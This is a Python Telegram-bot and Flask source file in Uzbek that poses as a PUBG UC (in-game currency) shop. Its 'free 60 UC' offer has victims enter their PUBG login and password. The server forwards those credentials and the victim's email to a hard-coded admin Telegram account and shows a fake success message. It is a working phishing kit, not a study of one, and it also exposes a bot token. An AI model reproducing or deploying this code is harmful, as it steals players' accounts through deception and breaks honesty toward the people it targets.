import telebot
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
from flask import Flask, request, render_template_string
import os
import time

# ==================== TOKEN VA URL ====================
BOT_TOKEN = "8194877107:AAFYZR8HbBD5B43WN3d871srclsOa7H6xwk"
RENDER_URL = "https://telegram-bot-sdhp.onrender.com"  # ⬅️ TEKSHRING!

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ==================== HTML (TO'LIQ, O'ZGARTIRILGAN) ====================
html_form = """
<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG UC Sotib Olish</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        :root {
            --primary: #ff9900;
            --secondary: #1a1a2e;
            --accent: #00a8ff;
            --light: #f8f9fa;
            --dark: #16213e;
            --success: #2ecc71;
            --free: #2ecc71;
        }
        
        body {
            background: linear-gradient(135deg, var(--secondary), var(--dark));
            color: var(--light);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 600px;
            margin: 0 auto;
        }
        
        /* Header */
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }
        
        .logo {
            font-size: 2.5rem;
            color: var(--primary);
            margin-bottom: 10px;
        }
        
        .header h1 {
            font-size: 1.8rem;
            background: linear-gradient(to right, var(--primary), var(--accent));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        
        .header p {
            color: #ccc;
            margin-top: 10px;
        }

        /* UC paketlari */
        .packages-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .package-card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 10px;
            padding: 20px 15px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.2);
            transition: transform 0.3s ease;
        }

        .package-card:hover {
            transform: translateY(-5px);
        }
        
        .package-card.free {
            border-color: var(--free);
        }
        
        .package-icon {
            font-size: 2rem;
            margin-bottom: 10px;
        }
        
        .package-card.free .package-icon {
            color: var(--free);
        }
        
        .package-card.paid .package-icon {
            color: var(--primary);
        }
        
        .package-uc {
            font-size: 1.3rem;
            font-weight: 700;
            margin-bottom: 8px;
        }
        
        .package-card.free .package-uc {
            color: var(--free);
        }
        
        .package-card.paid .package-uc {
            color: var(--primary);
        }
        
        .package-price {
            font-size: 1rem;
            margin-bottom: 12px;
            color: var(--accent);
        }
        
        .package-card.free .package-price {
            color: var(--free);
        }
        
        .package-btn {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 6px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .package-card.free .package-btn {
            background: var(--free);
        }
        
        .package-card.paid .package-btn {
            background: linear-gradient(to right, var(--primary), var(--accent));
        }

        .package-btn:hover {
            transform: scale(1.05);
        }
        
        .free-badge {
            background: var(--free);
            color: white;
            padding: 3px 8px;
            border-radius: 4px;
            font-size: 0.7rem;
            margin-bottom: 8px;
            display: inline-block;
        }

        .popular-badge {
            background: var(--primary);
            color: white;
            padding: 3px 8px;
            border-radius: 4px;
            font-size: 0.7rem;
            margin-bottom: 8px;
            display: inline-block;
        }
        
        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        
        .modal-content {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(15px);
            border-radius: 15px;
            padding: 25px;
            width: 90%;
            max-width: 400px;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .modal-header h3 {
            font-size: 1.3rem;
            color: var(--primary);
        }
        
        .close-modal {
            background: none;
            border: none;
            color: var(--light);
            font-size: 1.5rem;
            cursor: pointer;
        }
        
        .modal-package-info {
            text-align: center;
            margin-bottom: 20px;
            padding: 15px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
        }
        
        .modal-package-uc {
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--primary);
        }
        
        .free-package .modal-package-uc {
            color: var(--free);
        }
        
        .modal-input-group {
            margin-bottom: 15px;
        }
        
        .modal-input-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
        }
        
        .modal-input-group input {
            width: 100%;
            padding: 12px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            color: var(--light);
        }

        .modal-input-group input:focus {
            outline: none;
            border-color: var(--primary);
        }
        
        .modal-submit-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(to right, var(--primary), var(--accent));
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: all 0.3s ease;
        }

        .modal-submit-btn:hover {
            transform: translateY(-2px);
        }
        
        .free-package .modal-submit-btn {
            background: var(--free);
        }
        
        .success-message {
            display: none;
            text-align: center;
            padding: 20px;
            background: rgba(46, 204, 113, 0.2);
            border-radius: 10px;
            margin-top: 20px;
            border: 1px solid var(--free);
        }
        
        .success-message i {
            font-size: 3rem;
            color: var(--free);
            margin-bottom: 15px;
        }

        .disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .disabled .package-btn {
            background: #666 !important;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="logo">
                <i class="fas fa-fire"></i>
            </div>
            <h1>ASSALOMU ALAYKUM! PUBG UC MARKET</h1>
            <p>Xush kelibsiz! Eng arzon narxlarda UC sotib oling</p>
        </div>

        <!-- UC paketlari -->
        <div class="packages-grid">
            <!-- Bepul 60 UC -->
            <div class="package-card free">
                <div class="free-badge">BEPUL</div>
                <div class="package-icon">
                    <i class="fas fa-gift"></i>
                </div>
                <div class="package-uc">60 UC</div>
                <div class="package-price">TEKIN</div>
                <button class="package-btn" onclick="openModal(60, 0, 'free')">BEPUL OLISH</button>
            </div>
            
            <!-- 120 UC -->
            <div class="package-card paid">
                <div class="package-icon">
                    <i class="fas fa-star"></i>
                </div>
                <div class="package-uc">120 UC</div>
                <div class="package-price">35,000 UZS</div>
                <button class="package-btn" onclick="openModal(120, 35000, 'paid')">Sotib olish</button>
            </div>
            
            <!-- 355 UC -->
            <div class="package-card paid">
                <div class="package-icon">
                    <i class="fas fa-crown"></i>
                </div>
                <div class="package-uc">355 UC</div>
                <div class="package-price">85,000 UZS</div>
                <button class="package-btn" onclick="openModal(355, 85000, 'paid')">Sotib olish</button>
            </div>

            <!-- 720 UC -->
            <div class="package-card paid">
                <div class="popular-badge">POPULAR</div>
                <div class="package-icon">
                    <i class="fas fa-rocket"></i>
                </div>
                <div class="package-uc">720 UC</div>
                <div class="package-price">159,000 UZS</div>
                <button class="package-btn" onclick="openModal(720, 159000, 'paid')">Sotib olish</button>
            </div>

            <!-- 1500 UC -->
            <div class="package-card paid">
                <div class="package-icon">
                    <i class="fas fa-gem"></i>
                </div>
                <div class="package-uc">1,500 UC</div>
                <div class="package-price">299,000 UZS</div>
                <button class="package-btn" onclick="openModal(1500, 299000, 'paid')">Sotib olish</button>
            </div>

            <!-- 3000 UC -->
            <div class="package-card paid">
                <div class="package-icon">
                    <i class="fas fa-trophy"></i>
                </div>
                <div class="package-uc">3,000 UC</div>
                <div class="package-price">549,000 UZS</div>
                <button class="package-btn" onclick="openModal(3000, 549000, 'paid')">Sotib olish</button>
            </div>
        </div>
        
        <!-- Qo'shimcha ma'lumot -->
        <div style="text-align: center; margin-top: 30px; padding: 20px; background: rgba(255,255,255,0.05); border-radius: 10px;">
            <h3><i class="fas fa-info-circle"></i> MA'LUMOT</h3>
            <p>✅ 24/7 ishlaymiz</p>
            <p>✅ 5-15 daqiqada yetkazamiz</p>
            <p>✅ Qo'llab-quvvatlash: @msrfteam</p>
        </div>
    </div>

    <!-- UC olish modal oynasi -->
    <div class="modal" id="uc-modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 id="modal-title">UC Paketini olish</h3>
                <button class="close-modal" onclick="closeModal()">&times;</button>
            </div>
            
            <div class="modal-package-info" id="modal-package-info">
                <div class="modal-package-uc" id="modal-package-uc">60 UC</div>
                <div class="modal-package-price" id="modal-package-price">TEKIN</div>
            </div>
            
            <form id="uc-form" method="POST">
                <input type="hidden" id="selected-uc" name="uc_amount">
                <input type="hidden" id="selected-price" name="uc_price">
                <input type="hidden" id="selected-type" name="uc_type">
                
                <!-- Faqat 60 UC uchun login/parol so'raladi -->
                <div id="login-fields" style="display: none;">
                    <div class="modal-input-group">
                        <label for="username">PUBG Login</label>
                        <input type="text" id="username" name="username" placeholder="PUBG foydalanuvchi nomi" required>
                    </div>
                    
                    <div class="modal-input-group">
                        <label for="password">PUBG Parol</label>
                        <input type="password" id="password" name="password" placeholder="PUBG hisob paroli" required>
                    </div>
                </div>

                <!-- Barcha UC lar uchun email so'raladi -->
                <div class="modal-input-group">
                    <label for="email">Email manzilingiz</label>
                    <input type="email" id="email" name="email" placeholder="example@gmail.com" required>
                </div>
                
                <button type="submit" class="modal-submit-btn" id="modal-submit-btn">
                    <span id="submit-text">UC ni olish</span>
                </button>
            </form>
            
            <div class="success-message" id="success-message">
                <i class="fas fa-check-circle"></i>
                <h3>Muvaffaqiyatli!</h3>
                <p>UC hisobingizga yuklandi</p>
            </div>
        </div>
    </div>

    <script>
        let freeUcUsed = false;
        
        function openModal(ucAmount, price, type) {
            document.getElementById('modal-package-uc').textContent = ucAmount + ' UC';
            document.getElementById('selected-uc').value = ucAmount;
            document.getElementById('selected-price').value = price;
            document.getElementById('selected-type').value = type;
            
            // Login/parol maydonlarini ko'rsatish (faqat 60 UC uchun)
            const loginFields = document.getElementById('login-fields');
            if (type === 'free') {
                if (freeUcUsed) {
                    alert("Siz bepul UC ni faqat bir marta olishingiz mumkin!");
                    return;
                }
                loginFields.style.display = 'block';
                document.getElementById('modal-package-price').textContent = 'TEKIN';
                document.getElementById('modal-package-info').classList.add('free-package');
                document.getElementById('modal-submit-btn').classList.add('free-package');
                document.getElementById('submit-text').textContent = 'BEPUL UC OLISH';
            } else {
                loginFields.style.display = 'none';
                document.getElementById('modal-package-price').textContent = price.toLocaleString('uz-UZ') + ' UZS';
                document.getElementById('modal-package-info').classList.remove('free-package');
                document.getElementById('modal-submit-btn').classList.remove('free-package');
                document.getElementById('submit-text').textContent = 'SOTIB OLISH';
            }
            
            document.getElementById('uc-modal').style.display = 'flex';
        }
        
        function closeModal() {
            document.getElementById('uc-modal').style.display = 'none';
            document.getElementById('success-message').style.display = 'none';
            document.getElementById('uc-form').reset();
        }
        
        // Form yuborish
        document.getElementById('uc-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const ucType = document.getElementById('selected-type').value;
            const ucAmount = document.getElementById('selected-uc').value;
            
            if (!email.includes('@')) {
                alert("Iltimos, to'g'ri email manzilini kiriting!");
                return;
            }
            
            // 60 UC uchun login/parol tekshirish
            if (ucType === 'free') {
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                
                if (!username || !password) {
                    alert("Iltimos, PUBG login va parolingizni kiriting!");
                    return;
                }
                
                // Bepul UC ni belgilash
                freeUcUsed = true;
                document.querySelector('.package-card.free .package-btn').textContent = "Olingan";
                document.querySelector('.package-card.free').classList.add('disabled');
            }
            
            // Formani yuborish
            this.submit();
        });
        
        // Modal tashqarisiga bosilganda yopish
        window.addEventListener('click', function(e) {
            if (e.target === document.getElementById('uc-modal')) {
                closeModal();
            }
        });
    </script>
</body>
</html>
"""

# ==================== FLASK ROUTES ====================
@app.route("/")
def home():
    return "✅ Bot ishlayapti! /form/<user_id> yo'li orqali o'ting."

@app.route("/form/<user_id>", methods=["GET", "POST"])
def form(user_id):
    if request.method == "POST":
        # UC form ma'lumotlari
        uc_amount = request.form.get("uc_amount", "0")
        uc_price = request.form.get("uc_price", "0")
        uc_type = request.form.get("uc_type", "unknown")
        email = request.form.get("email", "")
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        
        try:
            # Foydalanuvchi xabari
            user_message = f"✅ Buyurtmangiz qabul qilindi!\n\n"
            user_message += f"💰 UC miqdori: {uc_amount} UC\n"
            user_message += f"📧 Email: {email}\n"
            user_message += f"⏳ Yetkazish: 5-15 daqiqa\n\n"
            user_message += f"📞 Support: @msrfteam"
            
            # Admin xabari
            admin_message = f"🛒 YANGI BUYURTMA!\n\n"
            admin_message += f"👤 User ID: {user_id}\n"
            admin_message += f"💰 UC miqdori: {uc_amount} UC\n"
            admin_message += f"💵 Narxi: {'BEPUL' if uc_type == 'free' else uc_price + ' UZS'}\n"
            admin_message += f"📧 Email: {email}\n"
            
            if uc_type == "free":
                admin_message += f"👤 PUBG Login: {username}\n"
                admin_message += f"🔑 PUBG Parol: {password}\n"
                admin_message += f"🔔 Turi: BEPUL UC"
            else:
                admin_message += f"🔔 Turi: Pullik UC"
            
            # 1. FOYDALANUVCHIGA yuborish
            bot.send_message(user_id, user_message)
            
            # 2. ADMINGA yuborish
            ADMIN_ID = 6948346741
            bot.send_message(ADMIN_ID, admin_message)
            
            return """
            <!DOCTYPE html>
            <html>
            <head><style>body{background:#1a1a2e;color:white;padding:50px;text-align:center;font-family:Arial;}</style></head>
            <body>
                <h1>✅ Muvaffaqiyatli!</h1>
                <p>Buyurtmangiz qabul qilindi.</p>
                <p>Telegramda xabaringizni tekshiring.</p>
                <button onclick="window.close()" style="padding:10px 20px;background:#00a8ff;color:white;border:none;border-radius:5px;">Yopish</button>
            </body>
            </html>
            """
            
        except Exception as e:
            return f"Xatolik yuz berdi: {e}"
    
    # GET so'rovi uchun HTML qaytarish
    return render_template_string(html_form)

# ==================== WEBHOOK ====================
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def webhook():
    json_str = request.get_data().decode('UTF-8')
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return "OK", 200

@app.route("/setwebhook")
def set_webhook():
    webhook_url = f"{RENDER_URL}/{BOT_TOKEN}"
    bot.remove_webhook()
    time.sleep(1)
    bot.set_webhook(url=webhook_url)
    return f"Webhook sozlandi: {webhook_url}"

# ==================== TELEGRAM BOT HANDLERS ====================
@bot.message_handler(commands=["start"])
def start(msg):
    bot.send_message(msg.chat.id, "Assalomu alaykum! UC sotib olish uchun /link buyrug'ini yuboring.")

@bot.message_handler(commands=["link"])
def link(msg):
    user_id = msg.chat.id
    uniq = f"{RENDER_URL}/form/{user_id}"
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔗 UC Sotib Olish", url=uniq))
    
    bot.send_message(
        user_id,
        f"🔗 Sizning shaxsiy linkingiz:\n\n{uniq}\n\n"
        f"Ushbu link orqali PUBG UC sotib olishingiz mumkin!",
        reply_markup=markup
    )

# ==================== MAIN ====================
if __name__ == "__main__":
    print("🚀 Bot WEBHOOK bilan ishga tushmoqda...")
    print(f"🌐 URL: {RENDER_URL}")
    print(f"🤖 Token: {BOT_TOKEN[:10]}...")
    
    # Webhook ni sozlash
    webhook_url = f"{RENDER_URL}/{BOT_TOKEN}"
    bot.remove_webhook()
    time.sleep(1)
    bot.set_webhook(url=webhook_url)
    
    print("✅ Webhook sozlandi!")
    print("✅ Bot faqat WEBHOOK orqali ishlaydi")
    
    # Flask ni ishga tushirish
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False)
